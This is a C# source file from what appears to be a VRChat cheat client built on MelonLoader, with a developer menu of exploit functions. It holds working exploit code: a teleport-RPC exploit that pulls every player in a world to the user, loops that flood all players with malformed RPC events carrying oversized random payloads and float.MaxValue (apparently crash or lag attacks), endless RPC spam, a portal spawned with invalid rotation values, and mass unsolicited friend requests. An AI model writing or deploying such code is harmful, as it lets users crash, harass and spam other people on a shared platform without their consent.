namespace AstroClient
{
    #region Imports

    using AstroClient.Exploits;
    using AstroClient.Variables;
    using AstroLibrary;
    using AstroLibrary.Console;
    using AstroLibrary.Extensions;
    using AstroLibrary.Utility;
    using MelonLoader;
    using RubyButtonAPI;
    using System;
    using System.Collections;
    using System.Collections.Generic;
    using System.Threading;
    using Transmtn.DTO.Notifications;
    using UnityEngine;
    using VRC.SDKBase;
    using static VRC.SDKBase.VRC_EventHandler;

    #endregion Imports

    /// <summary>
    /// Cheeto's temporary UI for new/wip features
    /// </summary>
    public class CheetosUI : GameEvents
    {
        public QMNestedButton MainButton { get; private set; }

        public QMScrollMenu MainScroller { get; private set; }

        public override void VRChat_OnUiManagerInit()
        {
            if (Bools.IsDeveloper)
            {
                MainButton = new QMNestedButton("ShortcutMenu", 5, 4, "<color=orange>Cheetos Menu</color>", "<color=orange>Cheeto's</color> Personal Menu", null, null, null, null, true);
                MainScroller = new QMScrollMenu(MainButton);
                _ = new QMSingleButton(MainButton, 1, 0, "Friend Everyone", () => { DoFriendEveryone(); }, "Friend Everyone!");
                _ = new QMSingleButton(MainButton, 1, 1, "Test #2", () => { Test2(); }, "Don't Do It!");
                _ = new QMSingleButton(MainButton, 1, 2, "Test #3", () => { Test3(); }, "Don't Do It!");
                _ = new QMSingleButton(MainButton, 2, 0, "Teleport\nEveryone\nHere", () => { Test4(); }, "Muahaha");
                _ = new QMSingleButton(MainButton, 3, 0, "Portal", () => { PortalDrop(); }, "Portal");
                _ = new QMSingleButton(MainButton, 3, 1, "Create Button", () => { CreateButton(); }, ":3");
                _ = new QMSingleButton(MainButton, 3, 2, "Photon", () => { PrintPhotonPlayers(); }, "Photon");
                _ = new QMSingleButton(MainButton, 4, 0, "RPC Test #1", () => { RPCClapTest1(); }, "RPC");
                _ = new QMSingleButton(MainButton, 4, 1, "RPC Test #2", () => { RPCClapTest2(); }, "RPC");
                _ = new QMSingleButton(MainButton, 4, 2, "RPC Test #3", () => { RPCClapTest3(); }, "RPC");
                _ = new QMSingleButton(MainButton, 4, 4, "Notorious\nHome", () => { WorldUtils.JoinWorld("wrld_9b92ff5d-d445-4a25-a4d5-0a776b869938#wrld_9b92ff5d-d445-4a25-a4d5-0a776b869938:42069"); }, "RPC");
            }
        }

        private void PortalDrop()
        {
            var Portal = Networking.Instantiate(VrcBroadcastType.Always, "Portals/PortalInternalDynamic", new Vector3(777, 777, 777), new Quaternion(float.MaxValue, float.MaxValue, 0, 0));
            Portal.SetActive(false);
        }

        private void Test4()
        {
            var position = Utils.LocalPlayer.gameObject.transform.position;
            var rotation = Utils.LocalPlayer.gameObject.transform.rotation;

            foreach (var player in WorldUtils.GetPlayers())
            {
                player.TeleportRPCExploit(position, rotation);
            }
        }

        private void Test3()
        {
        }

        private void Test2()
        {
            MiscFunc.InviteALLFriends();
        }

        private void DoFriendEveryone()
        {
            _ = MelonCoroutines.Start(FriendEveryone());
        }

        private IEnumerator FriendEveryone()
        {
            var players = WorldUtils.GetPlayers();

            int count = 0;
            foreach (var player in players)
            {
                if (!player.GetAPIUser().GetIsFriend() && !player.UserID().Equals(Utils.LocalPlayer.GetPlayer().UserID()))
                {
                    try
                    {
                        MiscUtils.DelayFunction(0.1f * count, () =>
                        {
                            Notification xx = FriendRequest.Create(player.UserID());
                            VRCWebSocketsManager.field_Private_Static_VRCWebSocketsManager_0.prop_Api_0.PostOffice.Send(xx);
                            CheetosHelpers.SendHudNotification($"Friend Request Sent: {player.DisplayName()}");
                        });
                        count++;
                    }
                    catch (Exception e)
                    {
                        ModConsole.Error(e.Message);
                    }
                }
                yield return null;
            }
            yield break;
        }

        private void CreateButton()
        {
            var buttonPosition = Utils.LocalPlayer.GetPlayer().Get_Center_Of_Player();
            if (buttonPosition != null)
            {
                var buttonRotation = Utils.LocalPlayer.GetPlayer().gameObject.transform.rotation;
                _ = ButtonCreator.Create("Test", buttonPosition.Value, buttonRotation, () => { ModConsole.Log("TestButton Clicked"); });
            }
        }

        public VRC_EventHandler handler;

        private byte[] GetByteArray(int sizeInKb)
        {
            System.Random rnd = new System.Random();
            byte[] b = new byte[sizeInKb * 1024]; // convert kb to byte
            rnd.NextBytes(b);
            return b;
        }

        public void RPCClapTest3()
        {
            if (handler == null)
            {
                DoHandlerThing();
            }

            int i = 0;
            while (i <= 100)
            {
                foreach (var player in WorldUtils.GetPlayers())
                {
                    handler.TriggerEvent(new VrcEvent
                    {
                        EventType = VrcEventType.SendRPC,
                        Name = "USpeak",
                        ParameterObject = player.gameObject,
                        ParameterInt = Utils.LocalPlayer.playerId,
                        ParameterFloat = float.MaxValue,
                        ParameterString = "Health",
                        ParameterBoolOp = VrcBooleanOp.Unused,
                        ParameterBytes = GetByteArray(100)
                    }, VrcBroadcastType.AlwaysUnbuffered, player.gameObject, 0f);
                }
                Thread.Sleep(1);
                i++;
            }
        }

        public void RPCClapTest2()
        {
            if (handler == null)
            {
                DoHandlerThing();
            }

            int i = 0;

            while (i <= 100)
            {
                foreach (var player in WorldUtils.GetPlayers())
                {
                    handler.TriggerEvent(new VrcEvent
                    {
                        EventType = VrcEventType.SendRPC,
                        Name = "AddHealth",
                        ParameterObject = player.gameObject,
                        ParameterInt = Utils.LocalPlayer.playerId,
                        ParameterFloat = float.MaxValue,
                        ParameterString = "Health",
                        ParameterBoolOp = VrcBooleanOp.Unused,
                        ParameterBytes = new byte[] { byte.MaxValue }
                    }, VrcBroadcastType.AlwaysUnbuffered, VRCPlayer.field_Internal_Static_VRCPlayer_0.gameObject, 0f);
                }
                Thread.Sleep(1);
                i++;
            }
        }

        public void RPCSendMessage(string msg)
        {
            handler.TriggerEvent(new VrcEvent
            {
                EventType = VrcEventType.SendRPC,
                Name = "SendRPC",
                ParameterObject = handler.gameObject,
                ParameterInt = Utils.LocalPlayer.playerId,
                ParameterFloat = 0f,
                ParameterString = "UdonSyncRunProgramAsRPC",
                ParameterBoolOp = VrcBooleanOp.Unused,
                ParameterBytes = Networking.EncodeParameters(new Il2CppSystem.Object[] { msg })
            }, VrcBroadcastType.AlwaysUnbuffered, VRCPlayer.field_Internal_Static_VRCPlayer_0.gameObject, 0f);
        }

        public IEnumerator Clap1()
        {
            for (int i = 0; i < int.MaxValue; i++)
            {
                RPCSendMessage("Test");
                yield return null;
            }
            yield break;
        }

        public void RPCClapTest1()
        {
            if (handler == null)
            {
                DoHandlerThing();
            }

            _ = MelonCoroutines.Start(Clap1());
        }

        public void DoHandlerThing()
        {
            handler = UnityEngine.Object.FindObjectOfType<VRC_EventHandler>();
            if (handler != null)
            {
                ModConsole.Log("VRC_EventHandler found!");
            }
        }

        public void PrintPhotonPlayers()
        {
            var room = Utils.LoadBalancingPeer.prop_Room_0;

            if (room == null)
            {
                ModConsole.Log("Room was null");
                return;
            }

            var players = room.prop_Dictionary_2_Int32_Player_0;

            if (players == null)
            {
                ModConsole.Log("Players was null");
                return;
            }

            foreach (var player in players)
            {
                ModConsole.Log($"Key: {player.Key}");
                ModConsole.Log($"Value: {player.Value.GetDisplayName()}");
            }
        }

        public override void OnWorldReveal(string id, string Name, List<string> tags, string AssetURL, string AuthorName)
        {
        }
    }
}